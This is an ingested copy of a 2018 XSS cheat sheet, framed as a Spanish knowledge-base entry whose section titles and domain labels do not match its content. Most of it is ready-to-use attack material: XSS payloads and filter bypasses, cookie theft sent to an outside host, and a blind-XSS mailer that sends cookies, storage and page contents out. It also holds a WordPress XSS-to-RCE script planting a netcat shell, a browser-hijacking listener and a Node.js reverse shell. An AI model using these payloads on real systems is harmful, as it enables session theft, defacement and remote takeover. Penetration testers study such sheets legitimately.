# 📚 Libro Completo: XSS Cheat Sheet

**Alcance:** Fuente bibliográfica completa sobre Web Software Factory, UI/UX, Architecture & Interactive Systems (XSS Cheat Sheet — Technical Author). Aplicable a la Web Software Factory. NO sustituye las reglas inmutables en `CANON_*`.

> **Autor:** Technical Author  
> **Dominio:** Web Software Factory, UI/UX, Architecture & Interactive Systems  
> **Archivo Fuente:** `XSS Cheat Sheet.pdf`  
> **Páginas Originales:** 28 (100% Ingerido, Cero Truncamiento)  
> **Secciones Técnicas Extraídas:** 6 (Entropía Técnica Media: 0.506)  
> **Fecha de Ingesta:** 2026-10-27  

---

## Sección 1: Core Concepts & Foundations [Entropy: 0.515]

HTML Context – Simple Tag Injection
Use when input lands inside an attribute’s value of an HTML tag or outside tag except
the ones described in next case. 
<svg onload=alert(1)>
"><svg onload=alert(1)>
HTML Context – In Block Tag Injection 
Use when input lands inside or between opening/closing of the following tags: 
<title><style><script><textarea><noscript><pre><xmp> and <iframe> (</tag> is 
accordingly). 
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
HTML Context – Inline Injection
Use when input lands inside an attribute’s value of an HTML tag but that tag can’t be 
terminated by greater than sign (>).
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
HTML Context – Source Injection
Use when input lands as a value of the following HTML tag attributes: href, src, data 
or action (also formaction). For src in script tag use an external script call (URL) or 
“data:,alert(1)”. 2nd payload below alerts out of target’s context for Webkit browsers.
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
Javascript Context – Code Injection
Use when input lands in a script block, inside a string delimited value.
'-alert(1)-'
'-alert(1)//
Javascript Context – Code Injection with Escape Bypass
Use when input lands in a script block, inside a string delimited value but quotes are 
escaped by a backslash.
\'-alert(1)//
Javascript Context – Code Injection in Logical Block
Use 1st or 2nd payloads when input lands in a script block, inside a string delimited 
value and inside a single logical block like function or conditional (if, else, etc). If 
quote is escaped with a backslash, use 3rd payload.

---

## Sección 2: Core Concepts & Foundations [Entropy: 0.53]

'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
Javascript Context – Tag Injection
Use when input lands anywhere in a script block. 
</script><svg onload=alert(1)>
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 7 

Advanced
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 8 

Multi Reflection – Double Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1=' 
*/alert(1)</script><script>/*
Multi Reflection – Triple Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
*/alert(1)">'onload="/*<svg/1=' 
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
Multi Input Reflections (Double & Triple)
Use to take advantage of multiple input reflections on same page.
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
File Upload Injection – Filename
Use when uploaded filename is reflected somewhere in target page.
"><svg onload=alert(1)>.gif
File Upload Injection – Metadata
Use when metadata of uploaded file is reflected somewhere in target page. It uses 
command-line exiftool and any metadata field can be set. 
brute@logic:~$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
File Upload Injection – SVG File
Use to create a stored XSS on target when uploading image files. Save content below 
as “xss.svg”.
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
DOM Insert Injection
Use to test for XSS when injection gets inserted into DOM as valid markup instead of 
being reflected in source code. It works for cases where script tag and other vectors 
won’t work. 
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
DOM Insert Injection – Resource Request
Use when javascript code of the page inserts into page the results of a request to an 
URL controlled by attacker (injection). 
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 9 

PHP_SELF Injection
Use when current URL is used by target’s underlying PHP code as an attribute value 
of an HTML form, for example. Inject between php extension and start of query part 
(?) using a leading slash (/). 
https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
Script Injection – No Closing 
Use when there’s a closing script tag (</script>) somewhere in the code after 
reflection. 
<script src=data:,alert(1)>
<script src=//brutelogic.com.br/1.js>
Javascript postMessage() DOM Injection (with Iframe) 
Use when there’s a “message” event listener like in 
“window.addEventListener(‘message’, ...)” in javascript code without a check for 
origin. Target must be able to be framed (X-Frame Options header according to 
context). Save as HTML file (or using data:text/html) providing TARGET_URL and 
INJECTION (a XSS vector or payload).
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
XML-based XSS
Use to inject XSS vector in a XML page (content types text/xml or application/xml).
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
Client Side Template Injection 
Use to test for client side template injection (useful for AngularJS injections below). It
must return 1024 when rendering.
{{32*32}}
AngularJS Injections (v1.6 and up)
Use when there’s an AngularJS library loaded in page, inside an HTML block with 
ng-app directive or creating your own.
{{constructor.constructor('alert(1)')()}}
<x ng-app>{{constructor.constructor('alert(1)')()}}
CRLF Injection
Use when application reflects input in one of response headers, allowing the injection 
of Carriage Return (%0D) and Line Feed (%0A) characters. Vectors for Gecko and 
Webkit, respectively. 
%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0A%0D%0A
%3Cscript%3Ealert(1)%3C/script%3E
%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection
%3a0%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 10 

Filter 
Bypass
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 11 

Mixed Case XSS
Use to bypass case-sensitive filters.
<Svg OnLoad=alert(1)>
<Script>alert(1)</Script> 
Unclosed Tags
Use in HTML injections to avoid filtering based in the presence of both lower than (<)
and greater than (>) signs. It requires a native greater than sign in source code after 
input reflection. 
<svg onload=alert(1)//
<svg onload="alert(1)"
Uppercase XSS
Use when application reflects input in uppercase.
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
Extra Content for Script Tags
Use when filter looks for “<script>” or “<script src=...” with some variations but 
without checking for other non-needed attribute.
<script/x>alert(1)</script>
Double Encoded XSS
Use when application performs double decoding of input. 
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
Alert without Parentheses (Strings Only)
Use in an HTML vector or javascript injection when parentheses are not allowed and 
a simple alert box is enough.
alert`1`
Alert without Parentheses
Use in an HTML vector or javascript injection when parentheses are not allowed and 
PoC needs to return any target info.
setInterval`alert\x28document.domain\x29`
setTimeout`alert\x28document.domain\x29`
Alert without Parentheses (Tag Exclusive)
Use only in HTML injections when parentheses are not allowed. Replace “&” with 
“%26” in URLs. 
<svg onload=alert&lpar;1&rpar;>
<svg onload=alert&#40;1&#41>
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 12

---

## Sección 3: Core Concepts & Foundations [Entropy: 0.605]

Remote Script Call
Use when you need to call an external script but your XSS vector is an handler-based 
one (like <svg onload=) or in javascript injections. The “brutelogic.com.br” domain 
along with HTML and js files are used as examples.
1. HTML-based (response must be HTML with an Access-Control-Allow-Origin 
(CORS) header)
"var x=new XMLHttpRequest();x.open('GET','//brutelogic.com.br/0.php');x.send();
x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
fetch('//brutelogic.com.br/0.php').then(function(r){r.text().then(function(w)
{write(w)})})
* (with fully loaded JQuery library)
$.get('//brutelogic.com.br/0.php',function(r){write(r)})
2. Javascript-based (response must be javascript)
with(document)body.appendChild(createElement('script')).src='//brutelogic.com.br/2.j
s'
* (with fully loaded JQuery library)
$.getScript('//brutelogic.com.br/2.js')
Wordpress XSS to RCE (up to v4.9.1)
Use it as a remote script to run when Wordpress admin gets XSSed with a listener like
netcat in port 5855. Plugin “Hello Dolly” is the target here but almost any other 
plugin can be used, changing file and path accordingly. 
p = '/wordpress/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`nc localhost 5855 -e /bin/bash`;';
a = new XMLHttpRequest();
a.open('GET', p+q, 0);
a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){
 if (this.readyState == 4) {
 fetch('/wordpress/wp-content/plugins/hello.php');

---

## Sección 4: Core Concepts & Foundations [Entropy: 0.59]

}
}
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 17 

Blind XSS Mailer
Use it as a blind XSS remote script saving as PHP file and changing $to and $headers 
vars accordingly. A working mail server needs to be present.
<?php header("Content-type: application/javascript"); ?>
var mailer = '<?php echo "//" . $_SERVER["SERVER_NAME"] . 
$_SERVER["REQUEST_URI"] ?>';
var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + 
document.URL; 
msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE 
COOKIES\n' + document.cookie;
msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + 
'\n\nLOCAL STORAGE\n' + JSON.stringify(localStorage); 
msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + 
encodeURIComponent(msg));
<?php
header("Access-Control-Allow-Origin: " . $_POST["origin"]);
$origin = $_POST["origin"];
$to = "myName@myDomain";
$subject = "XSS Blind Report for " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ". 
$_SERVER["HTTP_X_FORWARDED_FOR"];
$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];
$headers = "From: report@myDomain" . "\r\n";
if ($origin && $msg) {
 mail($to, $subject, $msg, $headers);
}
?>
Invisible Foreign XSS Embedding
Use to load a XSS from another domain (or subdomain) into the current one. 
Restricted by target’s X-Frame-Options (XFO) header. Example below alerts in 
brutelogic.com.br context regardless of domain. 
<iframe src="//brutelogic.com.br/xss.php?a=<svg onload=alert(document.domain)>" 
style=display:none></iframe>
Cookie Stealing
Use to get all cookies from victim user set by target site. It can’t get cookies protected 
by httpOnly security flag.
fetch('//brutelogic.com.br/?c='+document.cookie)
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 18 

Simple Virtual Defacement 
Use to change how site will appear to victim providing HTML code. In the example 
below a “Not Found” message is displayed.
<svg onload="documentElement.innerHTML='<h1>Not Found</h1>'">
Browser Remote Control
Use to hook browser and send javascript commands to it interactively. Use the 
javascript code below instead of alert(1) in your injection with an Unix-like terminal 
open with the following shell script (listener). Provide a HOST as a hostname, IP 
address or domain to receive commands from attacker machine.
Javascript:
setInterval(function(){with(document)body. 
appendChild(createElement('script')).src='//HOST:5855'},100)
Listener:
brute@logic:~$ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 19 

Miscellaneous
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 20 

XSS Online Test Page
Use to practice XSS vectors and payloads. Check source code for injection points.
https://brutelogic.com.br/xss.php
Multi-Case Filter-Aware HTML Injection
Use as one-shot to have higher successful XSS rates.
'"</Script><Html /Onmouseover=(alert)(1) //
Javascript Execution Delay
Use when a javascript library or any other needed resource for injection is not fully 
loaded in the execution of payload. A JQuery-based external call is used as example.
onload=function(){$.getScript('//brutelogic.com.br/2.js')}
onload=x=>$.getScript('//brutelogic.com.br/2.js')
Valid Source for Image Tags
Use when you need a valid src attribute to trigger an onload event instead of onerror 
one.
<img 
src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 
onload=alert(1)>
Shortest XSS
Use when you have a limited slot for injection. Requires a native script (present in 
source code already) called with relative path placed after where injection lands. 
Attacker server must reply with attacking script for exact request done by native script
(same path) or within a default 404 page (easier). The shorter domain is, the better.
<base href=//knoxss.me>
Mobile-only Event Handlers
Use when targeting mobile applications.
<html ontouchstart=alert(1)> 
<html ontouchend=alert(1)> 
<html ontouchmove=alert(1)> 
<body onorientationchange=alert(1)>
Body Tag
A collection of body vectors. Last one works only for Microsoft browsers.
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><a href=%23x>click this!#x
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<br><x id=x>#x
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! 
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 21 

Less Known XSS Vectors
A collection of less known XSS vectors.
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
Cross-Origin Script (Crosspwn) 
Save content below as .php file and use as following: 
http://facebook.com.localhost/crosspwn.php?
target=//brutelogic.com.br/tests/status.html&msg=<script>alert(document.domain)
Where “facebook.com” is an allowed origin and “localhost” is attacking domain, 
“//brutelogic.com.br/tests/status.html” is target page and 
“<script>alert(document.domain)” is message sent.
Another usage is for firing onresize and onhashchange body event handlers without 
user interaction:
http://localhost/crosspwn.php?target=//brutelogic.com.br/xss.php?
a=<body/onresize=alert(document.domain)> 
And to shorten and hide injected payload, the “name” extra field can be used. 
http://localhost/crosspwn.php?target=//brutelogic.com.br/xss.php?
a=<svg/onload=eval(name)>&name=alert(document.domain)
Code:
<!DOCTYPE html>
<body onload="crossPwn()">
<h2>CrossPwn</h2>
<iframe src="<?php echo htmlentities($_GET['target'], ENT_QUOTES) ?>" 
name="<?php echo $_GET['name'] ?>" height="0" 
style="visibility:hidden"></iframe>
<script>
 function crossPwn() {
 frames[0].postMessage('<?php echo $_GET["msg"] ?>','*'); // onmessage
 document.getElementsByTagName('iframe')[0].setAttribute('height', '1'); // 
onresize
 document.getElementsByTagName('iframe')[0].src = '<?php echo 
$_GET["target"] ?>' + '#brute'; // onhashchange
 }
</script>
</body>
</html>
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 22

---

## Sección 5: Core Concepts & Foundations [Entropy: 0.544]

Simple XSS Finder Script for PHP (Static Analysis)
Use to find potential XSS flaws in PHP source code. For Unix-like systems: save 
content below, allow execution and run with ./filename. It works for single file and 
recursive (folder and sub-folders). 
if [ -z $1 ]
then
 echo -e "Usage:\n$0 FILE\n$0 -r FOLDER"
 exit
else
 f=$1
fi
sources=(GET POST REQUEST "SERVER\['PHP" "SERVER\['PATH_" "SERVER\
['REQUEST_U")
sinks=(? echo die print printf print_r var_dump)
xssam(){
 for i in ${sources[@]}
 do
 a=$(grep -in "\$_${i}" $f | grep -o "\$.*=" | sed "s/[ ]\?=//g" | sort -u)
 for j in ${sinks[@]}
 do
 grep --color -in "${j}.*\$_${i}" $f
 for k in $a
 do
 grep --color -in "${j}.*$k" $f
 done
 done
 done
}
if [ $f != "-r" ]
then
 xssam
else
 for i in $(find $2 -type f -name "*.php")
 do
 echo "File: $i"
 f=$i
 xssam
 done
fi
Node.js RCE 
Use for command execution in vulnerable Node.js applications. Provide a HOST as a 
hostname, IP address or domain to receive the reverse shell from vulnerable server.
Javascript:
require('child_process').exec('bash -c "bash -i >& /dev/tcp/HOST/5855 0>&1"')
Listener:
brute@logic:~$ nc -lp 5855
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 23 

ASCII Encoding Table
Remember to replace “&” and “#” in URLs 
with their encoded version (%26 and %23 respectively).
HTML Entity
JS
Char
URL 
Encode Name(s)
Number Octal Hexa Unicode
NUL
%00
&#00;
\00
\x00
\u0000
SOH
%01
&#01;
\01
\x01
\u0001
STX
%02
&#02;
\02
\x02
\u0002
ETX
%03
&#03;
\03
\x03
\u0003
EOT
%04
&#04;
\04
\x04
\u0004
ENQ
%05
&#05;
\05
\x05
\u0005
ACK
%06
&#06;
\06
\x06
\u0006
BEL
%07
&#07;
\07
\x07
\u0007
BS
%08
&#08;
\10
\x08
\u0008
TAB
%09
&Tab;
&#09;
\11
\x09
\u0009
LF
%0A
&NewLine;
&#10;
\12
\x10
\u000A
VT
%0B
&#11;
\13
\x11
\u000B
FF
%0C
&#12;
\14
\x12
\u000C
CR
%0D
&#13;
\15
\x13
\u000D
SO
%0E
&#14;
\16
\x14
\u000E
SI 
%0F
&#15;
\17
\x15
\u000F
DLE
%10
&#16;
\20
\x16
\u0010
DC1
%11
&#17;
\21
\x17
\u0011
DC2
%12
&#18;
\22
\x18
\u0012
DC3
%13
&#19;
\23
\x19
\u0013
DC4
%14
&#20;
\24
\x20
\u0014
NAK
%15
&#21;
\25
\x21
\u0015
SYN
%16
&#22;
\26
\x22
\u0016
ETB
%17
&#23;
\27
\x23
\u0017
CAN
%18
&#24;
\30
\x24
\u0018
EM
%19
&#25;
\31
\x25
\u0019
SUB
%1A
&#26;
\32
\x26
\u001A
ESC
%1B
&#27;
\33
\x27
\u001B
FS
%1C
&#28;
\34
\x28
\u001C
GS
%1D
&#29;
\35
\x29
\u001D
RS
%1E
&#30;
\36
\x30
\u001E
US
%1F
&#31;
\37
\x31
\u001F
Space %20
&#32;
\40
\x32
\u0020
!
%21
&excl;
&#33;
\41
\x33
\u0021
"
%22
&quot; 
&QUOT;
&#34;
\42
\x34
\u0022
#
%23
&num;
&#35;
\43
\x35
\u0023
$
%24
&dollar;
&#36;
\44
\x36
\u0024
%
%25
&percnt;
&#37;
\45
\x37
\u0025
&
%26
&amp; 
&AMP;
&#38;
\46
\x38
\u0026
'
%27
&apos;
&#39;
\47
\x39
\u0027
(
%28
&lpar;
&#40;
\50
\x40
\u0028
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 24 
)
%29
&rpar;
&#41;
\51
\x41
\u0029
*
%2A
&ast; 
&midast;
&#42;
\52
\x42
\u002A
+
%2B
&plus;
&#43;
\53
\x43
\u002B
,
%2C
&comma;
&#44;
\54
\x44
\u002C
-
%2D
&minus;
&#45;
\55
\x45
\u002D
.
%2E
&period;
&#46;
\56
\x46
\u002E
/
%2F
&sol;
&#47;
\57
\x47
\u002F
0
%30
&#48;
\60
\x48
\u0030
1
%31
&#49;
\61
\x49
\u0031
2
%32
&#50;
\62
\x50
\u0032
3
%33
&#51;
\63
\x51
\u0033
4
%34
&#52;
\64
\x52
\u0034
5
%35
&#53;
\65
\x53
\u0035
6
%36
&#54;
\66
\x54
\u0036
7
%37
&#55;
\67
\x55
\u0037
8
%38
&#56;
\70
\x56
\u0038
9
%39
&#57;
\71
\x57
\u0039
:
%3A
&colon;
&#58;
\72
\x58
\u003A
;
%3B
&semi;
&#59;
\73
\x59
\u003B
<
%3C
&lt; &LT;
&#60;
\74
\x60
\u003C
=
%3D
&equals;
&#61;
\75
\x61
\u003D
>
%3E
&gt; &GT;
&#62;
\76
\x62
\u003E
?
%3F
&quest;
&#63;
\77
\x63
\u003F
@
%40
&commat;
&#64;
\100
\x64
\u0040
A
%41
&#65;
\101
\x65
\u0041
B
%42
&#66;
\102
\x66
\u0042
C
%43
&#67;
\103
\x67
\u0043
D
%44
&#68;
\104
\x68
\u0044
E
%45
&#79;
\105
\x79
\u0045
F
%46
&#70;
\106
\x70
\u0046
G
%47
&#71;
\107
\x71
\u0047
H
%48
&#72;
\110
\x72
\u0048
I
%49
&#73;
\111
\x73
\u0049
J
%4A
&#74;
\112
\x74
\u004A
K
%4B
&#75;
\113
\x75
\u004B
L
%4C
&#76;
\114
\x76
\u004C
M
%4D
&#77;
\115
\x77
\u004D
N
%4E
&#78;
\116
\x78
\u004E
O
%4F
&#79;
\117
\x79
\u004F
P
%50
&#80;
\120
\x80
\u0050
Q
%51
&#81;
\121
\x81
\u0051
R
%52
&#82;
\122
\x82
\u0052
S
%53
&#83;
\123
\x83
\u0053
T
%54
&#84;
\124
\x84
\u0054
U
%55
&#85;
\125
\x85
\u0055
V
%56
&#86;
\126
\x86
\u0056
W
%57
&#87;
\127
\x87
\u0057
X
%58
&#88;
\130
\x88
\u0058
Y
%59
&#89;
\131
\x89
\u0059
Z
%5A
&#90;
\132
\x90
\u005A
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 25 
[
%5B
&lqsb; 
&lbrack;
&#91;
\133
\x91
\u005B
\
%5C
&bsol;
&#92;
\134
\x92
\u005C
]
%5D
&rqsb; 
&rbrack;
&#93;
\135
\x93
\u005D
^
%5E
&Hat;
&#94;
\136
\x94
\u005E
_
%5F
&lowbar;
&#95;
\137
\x95
\u005F
`
%60
&grave; 
&DiacriticalG
rave;
&#96;
\140
\x96
\u0060
a
%61
&#97;
\141
\x97
\u0061
b
%62
&#98;
\142
\x98
\u0062
c
%63
&#99;
\143
\x99
\u0063
100 d
%64
&#100;
\144
\x100 \u0064
101 e
%65
&#101;
\145
\x101 \u0065
102 f
%66
&#102;
\146
\x102 \u0066
103 g
%67
&#103;
\147
\x103 \u0067
104 h
%68
&#104;
\150
\x104 \u0068
105 i
%69
&#105;
\151
\x105 \u0069
106 j
%6A
&#106;
\152
\x106 \u006A
107 k
%6B
&#107;
\153
\x107 \u006B
108 l
%6C
&#108;
\154
\x108 \u006C
109 m
%6D
&#109;
\155
\x109 \u006D
n
%6E
&#110;
\156
\x110 \u006E
o
%6F
&#111;
\157
\x111 \u006F
p
%70
&#112;
\160
\x112 \u0070
q
%71
&#113;
\161
\x113 \u0071
r
%72
&#114;
\162
\x114 \u0072
s
%73
&#115;
\163
\x115 \u0073
t
%74
&#116;
\164
\x116 \u0074
u
%75
&#117;
\165
\x117 \u0075
v
%76
&#118;
\166
\x118 \u0076
w
%77
&#119;
\167
\x119 \u0077
120 x
%78
&#120;
\170
\x120 \u0078
121 y
%79
&#121;
\171
\x121 \u0079
122 z
%7A
&#122;
\172
\x122 \u007A
123 {
%7B
&lcub; 
&lbrace;
&#123;
\173
\x123 \u007B
124 |
%7C
&verbar; 
&vert; 
&VerticalLine
&#124;
\174
\x124 \u007C
125 }
%7D
&rcub; 
&rbrace;
&#125;
\175
\x125 \u007D
126 ~
%7E
&#126;
\176
\x126 \u007E
127 DEL
%7F
&#127;
\177
\x127 \u007F
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 26

---

## Sección 6: Core Concepts & Foundations [Entropy: 0.25]

“XSS. XSS everywhere.”
Buzz & Woody internet meme.
_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 27 

_______________________________________________________________________________________________________
© 2018 Brute Logic – All rights reserved. 28

---
**Conexiones del Grafo (Obsidian):** [[INDEX]] · [[CANON_CYBERSECURITY_DEVSECOPS_2026]] · [[CYBERSECURITY_MASTER_PROTOCOL]] · [[ANTI_BOT_STEALTH_GUIDE]] · [[CANON_IDENTITY_AND_OAUTH_CYBERSECURITY_AUDIT_2026]] · #cybersecurity
